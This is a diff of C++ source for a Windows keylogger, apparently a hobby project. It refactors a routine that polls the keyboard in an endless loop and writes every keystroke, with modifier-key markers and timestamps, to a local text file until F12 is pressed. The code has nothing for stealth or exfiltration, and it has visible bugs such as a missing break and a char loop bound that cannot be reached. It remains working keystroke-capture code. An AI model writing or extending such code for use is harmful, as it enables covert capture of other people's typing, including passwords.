@@ -5,9 +5,14 @@
 #include "Keylogger.h"
 
 
-Keylogger::Keylogger() {
-    file.open("C:\\C_projects\\Keylogger.txt"); //open the file in unicode mode
-}
+Keylogger::Keylogger() {}
+
+
+//DWORD WINAPI Keylogger::startThread() {
+//    DWORD myThreadID;
+//    HANDLE myHandle = ::CreateThread(0, 0, startKeylogger, 0, 0, &myThreadID);
+//    return 0;
+//}
 
 
 void Keylogger::writeKeyToFile(char key) {
@@ -33,25 +38,26 @@ bool Keylogger::deleteKeyloggerData() {
 
 
 int Keylogger::startKeylogger() {
-    //wofstream file("C:\\C_projects\\Keylogger.txt"); //open the file in unicode mode
-    bool capsLock = GetKeyState(VK_CAPITAL); //Checking if the capsLock is on or off
-    SYSTEMTIME st;
+    Keylogger keylogger = Keylogger();
+
+   keylogger.file.open("C:\\C_projects\\Keylogger.txt"); //open the file in unicode mode
+
 
     //Checking if the file is open
-    if (!file.is_open()) {
-        cerr << "Can't open the file" << endl;
-        file.close();
+    if (!keylogger.file.is_open()) {
+        cerr << "Cant open the file (Constructor)" << endl;
         return -1;
     }
-    file.imbue(utf8_locale);
+    SYSTEMTIME st;
+    ::GetLocalTime(&st);
+    cout << "Keylogger::startKeylogger():start:" << st.wMilliseconds << endl;
+    bool capsLock = GetKeyState(VK_CAPITAL); //Checking if the capsLock is on or off
+    keylogger.file.imbue(keylogger.utf8_locale);
 
     char key;
-
-    ::GetLocalTime(&st);
-    file << "The Keylogger has started The Date is " << st.wDay << "." << st.wMonth << "." << st.wYear
-         << " And the Time is "
-         << st.wHour << ":" << st.wMinute << ":" << st.wSecond << endl;
-
+    keylogger.file << "The Keylogger has started The Date is " << st.wDay << "." << st.wMonth << "." << st.wYear
+                   << " And the Time is "
+                   << st.wHour << ":" << st.wMinute << ":" << st.wSecond << endl;
     while (true) {
         Sleep(10);
         for (key = 8; key <= 256; key++) {
@@ -60,40 +66,41 @@ int Keylogger::startKeylogger() {
 
                 switch (key) {
                     case VK_SPACE:
-                        file << ' ';
+                        keylogger.file << ' ';
                         break;
                     case VK_RETURN:
-                        file << '\n';
+                        keylogger.file << '\n';
                         break;
                     case VK_BACK:
-                        file << "[BACKSPACE]";
+                        keylogger.file << "[BACKSPACE]";
                         break;
                     case VK_CAPITAL:
                         capsLock = !capsLock;
                         break;
                     case VK_SHIFT:
-                        file << "[SHIFT]";
+                        keylogger.file << "[SHIFT]";
                         break;
                     case VK_CONTROL:
-                        file << "[CTRL]";
+                        keylogger.file << "[CTRL]";
                     case VK_ESCAPE:
-                        file << "[ESCAPE]";
+                        keylogger.file << "[ESCAPE]";
                         break;
                     case VK_MENU:
-                        file << "[ALT]";
+                        keylogger.file << "[ALT]";
                         break;
                     case VK_TAB:
-                        file << "[TAB]";
+                        keylogger.file << "[TAB]";
                         break;
                     case VK_F12:
                         cout << "F12 was pressed quitting" << endl;
                         ::GetLocalTime(&st);
-                        file << "\nThe Keylogger has closed The Date is " << st.wDay << "." << st.wMonth << "."
-                             << st.wYear
-                             << " And the Time is " << st.wHour << ":" << st.wMinute << ":" << st.wSecond << endl;
-                        file.flush();
-                        file.close();
-
+                        keylogger.file << "\nThe Keylogger has closed The Date is " << st.wDay << "." << st.wMonth
+                                       << "."
+                                       << st.wYear
+                                       << " And the Time is " << st.wHour << ":" << st.wMinute << ":" << st.wSecond
+                                       << endl;
+                        keylogger.file.flush();
+                        keylogger.file.close();
                         return 1;
                     case VK_F1:
                     case VK_F2:
@@ -134,19 +141,18 @@ int Keylogger::startKeylogger() {
                         break;
                     default:
                         if (capsLock)
-                            file << key;
+                            keylogger.file << key;
                         else
-                            writeKeyToFile(key);
-                        break;
+                            keylogger.writeKeyToFile(key);
                 }
             }
         }
     }
     ::GetLocalTime(&st);
-    file << "\nThe Keylogger closed The Date is " << st.wDay << "." << st.wMonth << "." << st.wYear
-         << " And the Time is "
-         << st.wHour << ":" << st.wMinute << ":" << st.wSecond << endl;
-    file.flush();
-    file.close();
+    keylogger.file << "\nThe Keylogger closed The Date is " << st.wDay << "." << st.wMonth << "." << st.wYear
+                   << " And the Time is "
+                   << st.wHour << ":" << st.wMinute << ":" << st.wSecond << endl;
+    keylogger.file.flush();
+    keylogger.file.close();
     return 1;
 }
